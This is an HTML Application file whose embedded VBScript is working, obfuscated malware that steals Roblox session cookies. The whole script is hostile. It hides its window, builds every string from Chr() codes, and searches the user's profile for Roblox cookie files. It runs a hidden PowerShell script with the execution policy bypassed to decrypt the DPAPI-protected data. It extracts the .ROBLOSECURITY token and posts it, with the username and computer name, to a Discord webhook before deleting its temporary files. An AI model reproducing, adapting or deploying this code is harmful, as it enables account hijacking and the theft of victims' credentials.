<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -4000,-4000
On Error Resume Next

' --- Webhook URL ---
Function WU(): WU = Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(115)&Chr(58)&Chr(47)&Chr(47)&Chr(100)&Chr(105)&Chr(115)&Chr(99)&Chr(111)&Chr(114)&Chr(100)&Chr(46)&Chr(99)&Chr(111)&Chr(109)&Chr(47)&Chr(97)&Chr(112)&Chr(105)&Chr(47)&Chr(119)&Chr(101)&Chr(98)&Chr(104)&Chr(111)&Chr(111)&Chr(107)&Chr(115)&Chr(47)&Chr(49)&Chr(53)&Chr(51)&Chr(51)&Chr(48)&Chr(49)&Chr(57)&Chr(56)&Chr(50)&Chr(52)&Chr(50)&Chr(55)&Chr(56)&Chr(55)&Chr(51)&Chr(50)&Chr(56)&Chr(53)&Chr(48)&Chr(47)&Chr(71)&Chr(67)&Chr(56)&Chr(111)&Chr(107)&Chr(49)&Chr(48)&Chr(77)&Chr(114)&Chr(90)&Chr(67)&Chr(89)&Chr(71)&Chr(107)&Chr(82)&Chr(108)&Chr(55)&Chr(82)&Chr(75)&Chr(72)&Chr(67)&Chr(86)&Chr(53)&Chr(89)&Chr(67)&Chr(84)&Chr(90)&Chr(49)&Chr(84)&Chr(90)&Chr(113)&Chr(80)&Chr(74)&Chr(68)&Chr(117)&Chr(52)&Chr(53)&Chr(84)&Chr(76)&Chr(80)&Chr(74)&Chr(111)&Chr(70)&Chr(78)&Chr(89)&Chr(85)&Chr(119)&Chr(69)&Chr(121)&Chr(84)&Chr(72)&Chr(56)&Chr(105)&Chr(71)&Chr(57)&Chr(89)&Chr(83)&Chr(48)&Chr(48)&Chr(75)&Chr(57)&Chr(56)&Chr(67)&Chr(119)&Chr(99)&Chr(76)&Chr(115)&Chr(117): End Function

Dim WH: WH = WU()
Dim sh, fso
Set sh = CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108))
Set fso = CreateObject(Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(105)&Chr(110)&Chr(103)&Chr(46)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(79)&Chr(98)&Chr(106)&Chr(101)&Chr(99)&Chr(116))

Dim PC, USER
PC   = sh.ExpandEnvironmentStrings(Chr(37)&"COMPUTERNAME"&Chr(37))
USER = sh.ExpandEnvironmentStrings(Chr(37)&"USERNAME"&Chr(37))

' Find cookie file
Dim LAPP: LAPP = sh.ExpandEnvironmentStrings(Chr(37)&"LOCALAPPDATA"&Chr(37))
Dim fp: fp = ""

Dim paths(4)
paths(0) = LAPP & Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(92)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(116)&Chr(111)&Chr(114)&Chr(97)&Chr(103)&Chr(101)&Chr(92)&Chr(114)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(99)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(46)&Chr(100)&Chr(97)&Chr(116)
paths(1) = LAPP & Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(92)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(116)&Chr(111)&Chr(114)&Chr(97)&Chr(103)&Chr(101)&Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(46)&Chr(100)&Chr(97)&Chr(116)
paths(2) = LAPP & Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(92)&Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)
paths(3) = sh.ExpandEnvironmentStrings(Chr(37)&"APPDATA"&Chr(37)) & Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(92)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(116)&Chr(111)&Chr(114)&Chr(97)&Chr(103)&Chr(101)&Chr(92)&Chr(114)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(99)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(46)&Chr(100)&Chr(97)&Chr(116)
paths(4) = sh.ExpandEnvironmentStrings(Chr(37)&"USERPROFILE"&Chr(37)) & Chr(92)&Chr(65)&Chr(112)&Chr(112)&Chr(68)&Chr(97)&Chr(116)&Chr(97)&Chr(92)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(92)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(116)&Chr(111)&Chr(114)&Chr(97)&Chr(103)&Chr(101)&Chr(92)&Chr(114)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(99)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(46)&Chr(100)&Chr(97)&Chr(116)

Dim i
For i = 0 To 4
    If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
Next

' UWP fallback
If Len(fp) = 0 Then
    Dim pk: pk = LAPP & Chr(92)&Chr(80)&Chr(97)&Chr(99)&Chr(107)&Chr(97)&Chr(103)&Chr(101)&Chr(115)
    If fso.FolderExists(pk) Then
        Dim folder, subf
        Set folder = fso.GetFolder(pk)
        For Each subf In folder.SubFolders
            If InStr(UCase(subf.Name), Chr(82)&Chr(79)&Chr(66)&Chr(76)&Chr(79)&Chr(88)) > 0 Then
                Dim uwp: uwp = subf.Path & Chr(92)&Chr(76)&Chr(111)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(116)&Chr(97)&Chr(116)&Chr(101)&Chr(92)&Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(46)&Chr(100)&Chr(97)&Chr(116)
                If fso.FileExists(uwp) Then fp = uwp : Exit For
            End If
        Next
        Set folder = Nothing
    End If
End If

If Len(fp) = 0 Then window.close()

' Read file
Dim raw: raw = ""
Dim fr: Set fr = fso.OpenTextFile(fp, 1)
raw = fr.ReadAll
fr.Close
Set fr = Nothing
If Len(raw) < 20 Then window.close()

' Extract Base64 from JSON
Dim CD: CD = Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(115)&Chr(68)&Chr(97)&Chr(116)&Chr(97)
Dim b64: b64 = ""
Dim jp: jp = InStr(raw, CD & Chr(34)&Chr(58)&Chr(34))
If jp > 0 Then
    jp = jp + 14
    Dim je: je = InStr(jp, raw, Chr(34))
    If je > jp Then b64 = Mid(raw, jp, je - jp)
End If

' Fallback: find DPAPI header directly
If Len(b64) < 50 Then
    Dim ah: ah = InStr(raw, "AQAAANCMnd8")
    If ah > 0 Then
        Dim bs: bs = ah
        Do While bs > 1
            bs = bs - 1
            If Mid(raw, bs, 1) = Chr(34) Then bs = bs + 1 : Exit Do
        Loop
        Dim be: be = InStr(ah, raw, Chr(34))
        If be > bs Then b64 = Mid(raw, bs, be - bs)
    End If
End If

If Len(b64) < 50 Then window.close()

' DPAPI decrypt
Dim TMP: TMP = sh.ExpandEnvironmentStrings(Chr(37)&"TEMP"&Chr(37))
Dim bf: bf = TMP & Chr(92) & "b.txt"
Dim of: of = TMP & Chr(92) & "d.txt"
Dim pf: pf = TMP & Chr(92) & "dp.ps1"

Dim fb: Set fb = fso.CreateTextFile(bf, True) : fb.Write b64 : fb.Close : Set fb = Nothing

Dim ps: Set ps = fso.CreateTextFile(pf, True)
ps.WriteLine "Add-Type -AssemblyName System.Security"
ps.WriteLine "try{"
ps.WriteLine "  $b64=(Get-Content '" & bf & "' -Raw).Trim()"
ps.WriteLine "  $bytes=[Convert]::FromBase64String($b64)"
ps.WriteLine "  $dec=[System.Security.Cryptography.ProtectedData]::Unprotect($bytes,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)"
ps.WriteLine "  [System.Text.Encoding]::UTF8.GetString($dec)|Out-File '" & of & "' -Encoding utf8"
ps.WriteLine "}catch{"
ps.WriteLine "  $_.Exception.Message|Out-File '" & of & "'"
ps.WriteLine "}"
ps.Close : Set ps = Nothing

fso.DeleteFile of, True
sh.Run Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108) & Chr(32)&Chr(45)&Chr(78)&Chr(111)&Chr(80)&Chr(32)&Chr(45)&Chr(69)&Chr(120)&Chr(101)&Chr(99)&Chr(32)&Chr(66)&Chr(121)&Chr(112)&Chr(97)&Chr(115)&Chr(115)&Chr(32)&Chr(45)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(32)&Chr(34) & pf & Chr(34), 0, True

Dim result: result = ""
If fso.FileExists(of) Then
    If fso.GetFile(of).Size > 0 Then
        Dim fr2: Set fr2 = fso.OpenTextFile(of, 1)
        result = fr2.ReadAll
        fr2.Close : Set fr2 = Nothing
    End If
End If

' Cleanup temp files
fso.DeleteFile bf, True
fso.DeleteFile pf, True
fso.DeleteFile of, True

If Len(result) < 10 Then window.close()

' =====================================================
' EXTRACT THE ACTUAL .ROBLOSECURITY COOKIE FROM RESULT
' =====================================================
Dim cookie: cookie = ""
Dim ROBLO: ROBLO = Chr(46)&Chr(82)&Chr(79)&Chr(66)&Chr(76)&Chr(79)&Chr(83)&Chr(69)&Chr(67)&Chr(85)&Chr(82)&Chr(73)&Chr(84)&Chr(89)
Dim WARN: WARN   = Chr(95)&Chr(124)&Chr(87)&Chr(65)&Chr(82)&Chr(78)&Chr(73)&Chr(78)&Chr(71)

' Method A: find .ROBLOSECURITY and extract value
Dim rp: rp = InStr(result, ROBLO)
If rp > 0 Then
    ' Skip past ".ROBLOSECURITY" (15 chars)
    rp = rp + 15
    ' Collect printable chars until we hit a structural boundary
    Dim clean: clean = ""
    Dim ci: For ci = rp To Len(result)
        Dim cch: cch = Mid(result, ci, 1)
        Dim cac: cac = Asc(cch)
        If cac >= 32 And cac <= 126 Then
            clean = clean & cch
        ElseIf cac = 0 Then
            Exit For
        End If
        If Len(clean) > 2000 Then Exit For
    Next
    If Len(clean) > 20 Then cookie = clean
End If

' Method B: find _|WARNING and extract from there
If Len(cookie) < 20 Then
    Dim wp: wp = InStr(result, WARN)
    If wp > 0 Then
        Dim wclean: wclean = ""
        Dim wi: For wi = wp To Len(result)
            Dim wch: wch = Mid(result, wi, 1)
            Dim wac: wac = Asc(wch)
            If wac >= 32 And wac <= 126 Then wclean = wclean & wch
            If Len(wclean) > 2000 Then Exit For
            If wac = 34 Or wac = 125 Or wac = 93 Then Exit For
        Next
        If Len(wclean) > 10 Then cookie = wclean
    End If
End If

' Method C: use entire result
If Len(cookie) < 10 Then cookie = result

' Final cleanup
cookie = Trim(cookie)
Dim final: final = ""
Dim fi: For fi = 1 To Len(cookie)
    Dim fch: fch = Mid(cookie, fi, 1)
    Dim fac: fac = Asc(fch)
    If fac >= 32 And fac <= 126 Or fac = 10 Or fac = 13 Then final = final & fch
Next
cookie = Trim(final)

If Len(cookie) < 5 Then window.close()

' =====================================================
' SEND TO DISCORD
' =====================================================
' Embed
Dim DQ: DQ = Chr(34)
Dim title: title = Chr(82)&Chr(111)&Chr(98)&Chr(108)&Chr(111)&Chr(120)&Chr(32)&Chr(67)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)
Dim desc: desc  = Chr(85)&Chr(115)&Chr(101)&Chr(114)&Chr(58)&Chr(32) & USER & Chr(32)&Chr(124)&Chr(32)&Chr(80)&Chr(67)&Chr(58)&Chr(32) & PC & Chr(32)&Chr(124)&Chr(32)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(58)&Chr(32) & fp

' JSON-escape
Dim et: et = Replace(title, Chr(92), Chr(92)&Chr(92)) : et = Replace(et, DQ, Chr(92)&DQ)
Dim ed: ed = Replace(desc, Chr(92), Chr(92)&Chr(92))  : ed = Replace(ed, DQ, Chr(92)&DQ)
ed = Replace(ed, vbCrLf, Chr(92)&Chr(110)) : ed = Replace(ed, vbCr, Chr(92)&Chr(110)) : ed = Replace(ed, vbLf, Chr(92)&Chr(110))

Dim j: j = Chr(123) & DQ & "embeds" & DQ & Chr(58)&Chr(91) & Chr(123) & DQ & "title" & DQ & Chr(58) & DQ & et & DQ & Chr(44) & DQ & "description" & DQ & Chr(58) & DQ & ed & DQ & Chr(44) & DQ & "color" & DQ & Chr(58) & 65280 & Chr(125)&Chr(93)&Chr(125)

Dim h: Set h = CreateObject(Chr(77)&Chr(83)&Chr(88)&Chr(77)&Chr(76)&Chr(50)&Chr(46)&Chr(83)&Chr(101)&Chr(114)&Chr(118)&Chr(101)&Chr(114)&Chr(88)&Chr(77)&Chr(76)&Chr(72)&Chr(84)&Chr(84)&Chr(80)&Chr(46)&Chr(54)&Chr(46)&Chr(48))
h.SetOption 2, 13056
h.Open Chr(80)&Chr(79)&Chr(83)&Chr(84), WH, False
h.SetRequestHeader Chr(67)&Chr(111)&Chr(110)&Chr(116)&Chr(101)&Chr(110)&Chr(116)&Chr(45)&Chr(84)&Chr(121)&Chr(112)&Chr(101), Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(47)&Chr(106)&Chr(115)&Chr(111)&Chr(110)
h.Send j
Set h = Nothing

' File attachment
Dim b: b = Mid(CreateObject(Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(108)&Chr(101)&Chr(116)&Chr(46)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(76)&Chr(105)&Chr(98)).GUID, 2, 36)
Dim fn: fn = Chr(99)&Chr(111)&Chr(111)&Chr(107)&Chr(105)&Chr(101)&Chr(46)&Chr(116)&Chr(120)&Chr(116)
Dim bd: bd = Chr(45)&Chr(45) & b & vbCrLf & Chr(67)&Chr(111)&Chr(110)&Chr(116)&Chr(101)&Chr(110)&Chr(116)&Chr(45)&Chr(68)&Chr(105)&Chr(115)&Chr(112)&Chr(111)&Chr(115)&Chr(105)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(58)&Chr(32)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(45)&Chr(100)&Chr(97)&Chr(116)&Chr(97)&Chr(59)&Chr(32)&Chr(110)&Chr(97)&Chr(109)&Chr(101)&Chr(61) & DQ & Chr(102)&Chr(105)&Chr(108)&Chr(101) & DQ & Chr(59)&Chr(32)&Chr(102)&Chr(105)&Chr(108)&Chr(101)&Chr(110)&Chr(97)&Chr(109)&Chr(101)&Chr(61) & DQ & fn & DQ & vbCrLf & vbCrLf & cookie & vbCrLf & Chr(45)&Chr(45) & b & Chr(45)&Chr(45)

Dim h2: Set h2 = CreateObject(Chr(77)&Chr(83)&Chr(88)&Chr(77)&Chr(76)&Chr(50)&Chr(46)&Chr(83)&Chr(101)&Chr(114)&Chr(118)&Chr(101)&Chr(114)&Chr(88)&Chr(77)&Chr(76)&Chr(72)&Chr(84)&Chr(84)&Chr(80)&Chr(46)&Chr(54)&Chr(46)&Chr(48))
h2.SetOption 2, 13056
h2.Open Chr(80)&Chr(79)&Chr(83)&Chr(84), WH, False
h2.SetRequestHeader Chr(67)&Chr(111)&Chr(110)&Chr(116)&Chr(101)&Chr(110)&Chr(116)&Chr(45)&Chr(84)&Chr(121)&Chr(112)&Chr(101), Chr(109)&Chr(117)&Chr(108)&Chr(116)&Chr(105)&Chr(112)&Chr(97)&Chr(114)&Chr(116)&Chr(47)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(45)&Chr(100)&Chr(97)&Chr(116)&Chr(97)&Chr(59)&Chr(32)&Chr(98)&Chr(111)&Chr(117)&Chr(110)&Chr(100)&Chr(97)&Chr(114)&Chr(121)&Chr(61) & b
h2.Send bd
Set h2 = Nothing

window.close()
</script>
</head><body></body></html>